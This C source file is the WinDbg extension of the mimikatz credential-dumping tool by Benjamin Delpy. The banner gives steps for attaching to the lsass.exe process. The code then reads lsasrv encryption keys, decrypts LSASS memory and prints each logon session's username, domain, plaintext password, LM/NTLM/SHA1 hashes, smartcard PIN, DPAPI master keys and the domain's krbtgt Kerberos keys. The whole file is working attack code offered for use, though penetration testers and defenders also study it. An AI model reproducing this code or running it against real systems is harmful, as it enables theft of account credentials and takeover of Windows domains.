/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kwindbg.h"

WINDBG_EXTENSION_APIS ExtensionApis = {0};
EXT_API_VERSION g_ExtApiVersion = {5 , 5 ,
#ifdef _M_X64
	EXT_API_VERSION_NUMBER64
#elif defined _M_IX86
	EXT_API_VERSION_NUMBER32
#endif
, 0};
USHORT NtBuildNumber = 0;

LPEXT_API_VERSION WDBGAPI ExtensionApiVersion (void)
{
	return &g_ExtApiVersion;
}

VOID CheckVersion(void)
{
	return;
}

VOID WDBGAPI WinDbgExtensionDllInit(PWINDBG_EXTENSION_APIS lpExtensionApis, USHORT usMajorVersion, USHORT usMinorVersion)
{
	ExtensionApis = *lpExtensionApis;
	NtBuildNumber = usMinorVersion;
	
	dprintf("\n"
		"  .#####.   " MIMIKATZ_FULL_A "\n"
		" .## ^ ##.  Windows build %hu\n"
		" ## / \\ ##  /* * *\n"
		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n"
		"  '#####'                                  WinDBG extension ! * * */\n\n"
		"===================================\n"
		"#         * Kernel mode *         #\n"
		"===================================\n"
		"# Search for LSASS process\n"
		"0: kd> !process 0 0 lsass.exe\n"
		"# Then switch to its context\n"
		"0: kd> .process /r /p <EPROCESS address>\n"
		"# And finally :\n"
		"0: kd> !mimikatz\n"
		"===================================\n"
		"#          * User mode *          #\n"
		"===================================\n"
		"0:000> !mimikatz\n"
		"===================================\n\n" , NtBuildNumber);
}

const char * KUHL_M_SEKURLSA_LOGON_TYPE[] = {
	"UndefinedLogonType", "Unknown !", "Interactive", "Network",
	"Batch", "Service", "Proxy", "Unlock", "NetworkCleartext",
	"NewCredentials", "RemoteInteractive", "CachedInteractive",
	"CachedRemoteInteractive", "CachedUnlock",
};

KUHL_M_SEKURLSA_PACKAGE packages[] = {
	{"msv",			NULL,									0, kuhl_m_sekurlsa_enum_logon_callback_msv},
	{"tspkg",		"tspkg!TSGlobalCredTable",				0, kuhl_m_sekurlsa_enum_logon_callback_tspkg},
	{"wdigest",		"wdigest!l_LogSessList",				0, kuhl_m_sekurlsa_enum_logon_callback_wdigest},
	{"livessp",		"livessp!LiveGlobalLogonSessionList",	0, kuhl_m_sekurlsa_enum_logon_callback_livessp},
	{"kerberos",	"kerberos!KerbGlobalLogonSessionTable",	0, kuhl_m_sekurlsa_enum_logon_callback_kerberos},
	{"ssp",			"msv1_0!SspCredentialList",				0, kuhl_m_sekurlsa_enum_logon_callback_ssp},
	{"masterkey",	"lsasrv!g_MasterKeyCacheList",			0, kuhl_m_sekurlsa_enum_logon_callback_masterkeys},
	{"masterkey",	"dpapisrv!g_MasterKeyCacheList",		0, kuhl_m_sekurlsa_enum_logon_callback_masterkeys},
	{"credman",		NULL,									0, kuhl_m_sekurlsa_enum_logon_callback_credman},
};

const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
};

DECLARE_API(mimikatz)
{
	ULONG_PTR pInitializationVector = 0, phAesKey = 0, ph3DesKey = 0, pLogonSessionList = 0, pLogonSessionListCount = 0, pSecData = 0;
	PLIST_ENTRY LogonSessionList;
	ULONG LogonSessionListCount, i, j;
	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
	const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
	PBYTE buffer;
	DUAL_KRBTGT dualKrbtgt = {NULL, NULL};

	if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_7)
		helper = &lsassEnumHelpers[0];
	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_8)
		helper = &lsassEnumHelpers[1];
	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
		helper = &lsassEnumHelpers[3];
	else
		helper = &lsassEnumHelpers[4];

	if((NtBuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (NtBuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (GetExpression("lsasrv!LogonSessionLeakList")))
			helper++; // yeah, really, I do that =)

	pInitializationVector = GetExpression("lsasrv!InitializationVector");
	phAesKey = GetExpression("lsasrv!hAesKey");
	ph3DesKey = GetExpression("lsasrv!h3DesKey");

	pLogonSessionList = GetExpression("lsasrv!LogonSessionList");
	pLogonSessionListCount = GetExpression("lsasrv!LogonSessionListCount");
	pSecData = GetExpression("kdcsvc!SecData");

	for(j = 0; j < ARRAYSIZE(packages); j++)
		if(packages[j].symbolName)
			packages[j].symbolPtr = GetExpression(packages[j].symbolName);
	
	if(pSecData)
	{
		if(ReadMemory(pSecData + SECDATA_KRBTGT_OFFSET*sizeof(PVOID), &dualKrbtgt, 2*sizeof(PVOID), NULL))
		{
			kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_current, "Current");
			kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_previous, "Previous");
		}
	}
	
	if(NT_SUCCESS(kuhl_m_sekurlsa_nt6_init()))
	{
		if(pInitializationVector && phAesKey && ph3DesKey)
		{
			if(NT_SUCCESS(kuhl_m_sekurlsa_nt6_acquireKeys(pInitializationVector, phAesKey, ph3DesKey)))
			{
				if(pLogonSessionListCount && pLogonSessionList)
				{
					if(ReadMemory(pLogonSessionListCount, &LogonSessionListCount, sizeof(ULONG), NULL))
					{
						if(LogonSessionList = (PLIST_ENTRY) LocalAlloc(LPTR, sizeof(LIST_ENTRY) * LogonSessionListCount))
						{
							if(ReadMemory(pLogonSessionList, LogonSessionList, sizeof(LIST_ENTRY) * LogonSessionListCount, NULL))
							{
								if(buffer = (PBYTE) LocalAlloc(LPTR, helper->tailleStruct))
								{
									for(i = 0; i < LogonSessionListCount; i++)
									{
										*(PVOID *) (buffer) = LogonSessionList[i].Flink;
										while(pLogonSessionList + (i * sizeof(LIST_ENTRY)) != (ULONG_PTR) *(PVOID *) (buffer))
										{
											if(ReadMemory((ULONG_PTR) *(PVOID *) (buffer), buffer, helper->tailleStruct, NULL))
											{
												sessionData.LogonId		= (PLUID)			(buffer + helper->offsetToLuid);
												sessionData.LogonType	= *((PULONG)		(buffer + helper->offsetToLogonType));
												sessionData.Session		= *((PULONG)		(buffer + helper->offsetToSession));
												sessionData.UserName	= (PUNICODE_STRING) (buffer + helper->offsetToUsername);
												sessionData.LogonDomain	= (PUNICODE_STRING) (buffer + helper->offsetToDomain);
												sessionData.pCredentials= *(PVOID *)		(buffer + helper->offsetToCredentials);
												sessionData.pSid		= *(PSID *)			(buffer + helper->offsetToPSid);
												sessionData.pCredentialManager = *(PVOID *) (buffer + helper->offsetToCredentialManager);
												sessionData.LogonTime	= *((PFILETIME)		(buffer + helper->offsetToLogonTime));
												sessionData.LogonServer	= (PUNICODE_STRING) (buffer + helper->offsetToLogonServer);

												if((sessionData.LogonType != Network) /*&& (sessionData.LogonType != UndefinedLogonType)*/)
												{
													kull_m_string_getDbgUnicodeString(sessionData.UserName);
													kull_m_string_getDbgUnicodeString(sessionData.LogonDomain);
													kull_m_string_getDbgUnicodeString(sessionData.LogonServer);
													kuhl_m_sekurlsa_utils_getSid(&sessionData.pSid);
													dprintf("\nAuthentication Id : %u ; %u (%08x:%08x)\n"
														"Session           : %s from %u\n"
														"User Name         : %wZ\n"
														"Domain            : %wZ\n"
														"Logon Server      : %wZ\n"
														, sessionData.LogonId->HighPart, sessionData.LogonId->LowPart, sessionData.LogonId->HighPart, sessionData.LogonId->LowPart
														, KUHL_M_SEKURLSA_LOGON_TYPE[sessionData.LogonType], sessionData.Session
														, sessionData.UserName, sessionData.LogonDomain, sessionData.LogonServer);
													
													dprintf("Logon Time        : ");
													kull_m_string_displayLocalFileTime(&sessionData.LogonTime);
													dprintf("\n");

													dprintf("SID               : ");
													if(sessionData.pSid)
														kull_m_string_displaySID(sessionData.pSid);
													dprintf("\n");

													LocalFree(sessionData.UserName->Buffer);
													LocalFree(sessionData.LogonDomain->Buffer);
													LocalFree(sessionData.LogonServer->Buffer);
													LocalFree(sessionData.pSid);

													for(j = 0; j < ARRAYSIZE(packages); j++)
														if(packages[j].symbolPtr || !packages[j].symbolName)
														{
															dprintf("\t%s : ", packages[j].name);
															packages[j].callback(packages[j].symbolPtr, &sessionData);
															dprintf("\n");
														}
												}
											}
											else break;
										}
									}
									LocalFree(buffer);
								}
							}
							LocalFree(LogonSessionList);
						}
					}
				} else dprintf("[ERROR] [LSA] Symbols\n%p - lsasrv!LogonSessionListCount\n%p - lsasrv!LogonSessionList\n", pLogonSessionListCount, pLogonSessionList);
			} else dprintf("[ERROR] [CRYPTO] Acquire keys");
		} else dprintf("[ERROR] [CRYPTO] Symbols\n%p - lsasrv!InitializationVector\n%p - lsasrv!hAesKey\n%p - lsasrv!h3DesKey\n", pInitializationVector, phAesKey, ph3DesKey);
		kuhl_m_sekurlsa_nt6_LsaCleanupProtectedMemory();
	} else dprintf("[ERROR] [CRYPTO] Init\n");
}

UNICODE_STRING uNull = {12, 14, L"(null)"};
VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags)
{
	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
	PMSV1_0_PRIMARY_CREDENTIAL_10 pPrimaryCreds10;
	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
	PKERB_HASHPASSWORD_6 pHashPassword;
	UNICODE_STRING buffer;
	PVOID base;
	DWORD type, i;
	BOOL isNull = FALSE;

	if(mesCreds)
	{
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL)
		{
			type = flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK;
			credentials = (PUNICODE_STRING) mesCreds;
			if(credentials->Buffer)
			{
				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
					kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(((PUNICODE_STRING) mesCreds)->Buffer, ((PUNICODE_STRING) mesCreds)->Length);
				
				switch(type)
				{
				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
					pPrimaryCreds = (PMSV1_0_PRIMARY_CREDENTIAL) credentials->Buffer;
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->UserName, FALSE);
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->LogonDomainName, FALSE);

					dprintf("\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName);
					if(pPrimaryCreds->isLmOwfPassword)
					{
						dprintf("\n\t * LM       : ");
						kull_m_string_dprintf_hex(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					}
					if(pPrimaryCreds->isNtOwfPassword)
					{
						dprintf("\n\t * NTLM     : ");
						kull_m_string_dprintf_hex(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					}
					if(pPrimaryCreds->isShaOwPassword)
					{
						dprintf("\n\t * SHA1     : ");
						kull_m_string_dprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
					}
					break;
				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10:
					pPrimaryCreds10 = (PMSV1_0_PRIMARY_CREDENTIAL_10) credentials->Buffer;
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds10, &pPrimaryCreds10->UserName, FALSE);
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds10, &pPrimaryCreds10->LogonDomainName, FALSE);

					dprintf("\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds10->UserName, &pPrimaryCreds10->LogonDomainName);
					dprintf("\n\t * Flags    : %02x/N%02x/L%02x/S%02x/%02x/%02x/%02x/%02x", pPrimaryCreds10->isUnk0, pPrimaryCreds10->isNtOwfPassword, pPrimaryCreds10->isLmOwfPassword, pPrimaryCreds10->isShaOwPassword, pPrimaryCreds10->isUnk1, pPrimaryCreds10->isUnk2, pPrimaryCreds10->isUnk3, pPrimaryCreds10->isUnk4);
					if(pPrimaryCreds10->isLmOwfPassword)
					{
						dprintf("\n\t * LM       : ");
						kull_m_string_dprintf_hex(pPrimaryCreds10->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					}
					if(pPrimaryCreds10->isNtOwfPassword)
					{
						dprintf("\n\t * NTLM     : ");
						kull_m_string_dprintf_hex(pPrimaryCreds10->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					}
					if(pPrimaryCreds10->isShaOwPassword)
					{
						dprintf("\n\t * SHA1     : ");
						kull_m_string_dprintf_hex(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
					}
					dprintf("\n\t * unknow   : ");
					for(i = 0; !isNull && (i < 128); i++)
						isNull |= !pPrimaryCreds10->UnkStruct[i];
					if(isNull)
						dprintf("[0..0]");
					else
						kull_m_string_dprintf_hex(pPrimaryCreds10->UnkStruct, 128, 0);
					break;
				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL) + (pRpceCredentialKeyCreds->unk0 - 1) * sizeof(MARSHALL_KEY);
					for (i = 0; i < pRpceCredentialKeyCreds->unk0; i++)
						kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key[i], &base);
					break;
				default:
					dprintf("\n\t * Raw data : ");
					kull_m_string_dprintf_hex(credentials->Buffer, credentials->Length, 1);
				}
			}
		}
		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE)
		{
			dprintf("\n\t * Smartcard"); 
			if(mesCreds->UserName.Buffer)
			{
				if(kull_m_string_getDbgUnicodeString(&mesCreds->UserName))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(mesCreds->UserName.Buffer, mesCreds->UserName.MaximumLength);
					dprintf("\n\t     PIN code : %wZ", &mesCreds->UserName);
					LocalFree(mesCreds->UserName.Buffer);
				}
			}
			if(mesCreds->Domaine.Buffer)
			{
				dprintf(
					"\n\t     Model    : %S"
					"\n\t     Reader   : %S"
					"\n\t     Key name : %S"
					"\n\t     Provider : %S",
					(PBYTE) mesCreds->Domaine.Buffer + sizeof(KIWI_KERBEROS_CSP_NAMES) + sizeof(wchar_t) * ((PKIWI_KERBEROS_CSP_NAMES) mesCreds->Domaine.Buffer)->offsetToCard,
					(PBYTE) mesCreds->Domaine.Buffer + sizeof(KIWI_KERBEROS_CSP_NAMES) + sizeof(wchar_t) * ((PKIWI_KERBEROS_CSP_NAMES) mesCreds->Domaine.Buffer)->offsetToReader,
					(PBYTE) mesCreds->Domaine.Buffer + sizeof(KIWI_KERBEROS_CSP_NAMES) + sizeof(wchar_t) * ((PKIWI_KERBEROS_CSP_NAMES) mesCreds->Domaine.Buffer)->offsetToSerial,
					(PBYTE) mesCreds->Domaine.Buffer + sizeof(KIWI_KERBEROS_CSP_NAMES) + sizeof(wchar_t) * ((PKIWI_KERBEROS_CSP_NAMES) mesCreds->Domaine.Buffer)->offsetToProvider
					);
			}
		}
		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
		{
			pHashPassword = (PKERB_HASHPASSWORD_6) mesCreds;
			dprintf("\n\t\t%s : ", kuhl_m_kerberos_ticket_etype(pHashPassword->Type));
			if(buffer.Length = buffer.MaximumLength = (USHORT) pHashPassword->Size)
			{
				buffer.Buffer = (PWSTR) pHashPassword->Checksump;
				if(kull_m_string_getDbgUnicodeString(&buffer))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(buffer.Buffer, buffer.MaximumLength);
					kull_m_string_dprintf_hex(buffer.Buffer, buffer.Length, 0);
					LocalFree(buffer.Buffer);
				}
			}
			else dprintf("<no size, buffer is incorrect>");
		}
		else
		{
			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
			{
				if(kull_m_string_getDbgUnicodeString(&mesCreds->UserName) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						username = &mesCreds->UserName;
					else
						domain = &mesCreds->UserName;
				}
				if(kull_m_string_getDbgUnicodeString(&mesCreds->Domaine) && kull_m_string_suspectUnicodeString(&mesCreds->Domaine))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						domain = &mesCreds->Domaine;
					else
						username = &mesCreds->Domaine;
				}
				if(kull_m_string_getDbgUnicodeString(&mesCreds->Password) /*&& !kull_m_string_suspectUnicodeString(&mesCreds->Password)*/)
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength);
					password = &mesCreds->Password;
				}

				if(password || !(flags & KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY))
				{
					dprintf((flags & KUHL_SEKURLSA_CREDS_DISPLAY_LINE) ?
						"%wZ\t%wZ\t"
						:
						"\n\t * Username : %wZ"
						"\n\t * Domain   : %wZ"
						"\n\t * Password : "
						, username ? username : &uNull, domain ? domain : &uNull);

					if(!password || kull_m_string_suspectUnicodeString(password))
					{
						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
							dprintf("%.*S", password->Length / sizeof(wchar_t), password->Buffer);
						else
							dprintf("%wZ", password ? password : &uNull);
					}
					else kull_m_string_dprintf_hex(password->Buffer, password->Length, 1);
				}

				LocalFree(mesCreds->UserName.Buffer);
				LocalFree(mesCreds->Domaine.Buffer);
				LocalFree(mesCreds->Password.Buffer);
			}
		}
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE)
			dprintf("\n");
	}
	else dprintf("LUID KO\n");
}

VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
{
	switch(key->unkId)
	{
	case 0x00010002:
	case 0x00010003:
		dprintf("\n\t * NTLM     : ");
		break;
	case 0x00020002:
		dprintf("\n\t * SHA1     : ");
		break;
	case 0x00030002:
	case 0x00030003:
		dprintf("\n\t * RootKey  : ");
		break;
	case 0x00040002:
	case 0x00040003:
		dprintf("\n\t * DPAPI    : ");
		break;
	default:
		dprintf("\n\t * %08x : ", key->unkId);
	}
	kull_m_string_dprintf_hex((PBYTE) *dirtyBase + sizeof(ULONG), key->length, 0);
	*dirtyBase = (PBYTE) *dirtyBase + sizeof(ULONG) + *(PULONG) *dirtyBase;
}

void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, LPCSTR prefix)
{
	DWORD sizeForCreds, i;
	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
	PVOID buffer;

	if(addr)
	{
		dprintf("\n%s krbtgt: ", prefix);
		if(ReadMemory((ULONG_PTR) addr, &tmpCred6, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6), NULL))
		{
			sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
			if(creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
			{
				if(ReadMemory((ULONG_PTR) addr, creds6, sizeForCreds, NULL))
				{
					dprintf("%u credentials\n", creds6->cbCred);
					for(i = 0; i < creds6->cbCred; i++)
					{
						dprintf("\t * %s : ", kuhl_m_kerberos_ticket_etype((LONG) creds6->credentials[i].type));
						if(buffer = LocalAlloc(LPTR, (DWORD) creds6->credentials[i].size))
						{
							if(ReadMemory((ULONG_PTR) creds6->credentials[i].key, buffer, (DWORD) creds6->credentials[i].size, NULL))
								kull_m_string_dprintf_hex(buffer, (DWORD) creds6->credentials[i].size, 0);
							LocalFree(buffer);
						}
						dprintf("\n");
					}
				}
				LocalFree(creds6);
			}
		}
	}
}